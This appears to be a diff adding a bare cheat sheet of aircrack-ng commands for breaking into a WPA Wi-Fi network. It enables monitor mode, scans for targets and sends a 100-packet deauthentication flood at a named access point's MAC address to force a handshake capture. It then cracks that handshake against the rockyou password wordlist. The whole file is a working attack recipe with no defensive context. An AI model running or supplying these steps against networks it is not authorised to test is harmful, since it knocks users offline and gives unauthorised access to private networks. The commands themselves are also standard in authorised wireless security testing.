@@ -1,0 +1,11 @@
+iwconfig
+sudo airmon-ng check kill
+sudo airmon-ng start wlan1
+iwconfig
+sudo airodump-ng wlan1
+sudo airodump-ng -c 6 --essid Wifi_Name wlan1 -w Wifi_Name
+sudo aireplay-ng -0 100 -a 68:7F:74:01:28:E1 wlan1
+ 
+ *Wait till WPA Handshake is captured*
+ 
+aircrack-ng Wifi_Name.cap -w /usr/share/wordlists/rockyou.txt
